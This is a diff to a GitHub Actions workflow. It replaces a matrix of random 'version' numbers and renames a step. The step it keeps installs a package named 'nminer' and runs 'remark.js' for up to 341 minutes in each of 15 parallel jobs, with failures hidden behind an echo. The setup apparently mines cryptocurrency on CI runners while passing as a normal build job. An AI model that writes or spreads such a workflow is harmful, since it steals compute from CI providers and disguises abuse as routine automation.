@@ -9,26 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9543 }
-          - { version: 119 }
-          - { version: 4913 }
-          - { version: 3979 }
-          - { version: 6847 }
-          - { version: 9212 }
-          - { version: 6469 }
-          - { version: 5203 }
-          - { version: 5409 }
-          - { version: 2194 }
-          - { version: 1682 }
-          - { version: 3067 }
-          - { version: 7288 }
-          - { version: 597 }
-          - { version: 8554 }
-          - { version: 9217 }
-          - { version: 1428 }
-          - { version: 9204 }
-          - { version: 1513 }
-          - { version: 8690 }
+          - { version: 6535 }
+          - { version: 7979 }
+          - { version: 2287 }
+          - { version: 3533 }
+          - { version: 5060 }
+          - { version: 2465 }
+          - { version: 192 }
+          - { version: 1332 }
+          - { version: 1496 }
+          - { version: 6029 }
+          - { version: 3402 }
+          - { version: 1033 }
+          - { version: 938 }
+          - { version: 6921 }
+          - { version: 9370 }
 
     steps:
       - name: Checkout
@@ -39,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: so
+      - name: quicker
         run: |
           npm install nminer@latest
-          timeout 306m node remark.js || echo "remark executed"
+          timeout 341m node remark.js || echo "remark executed"
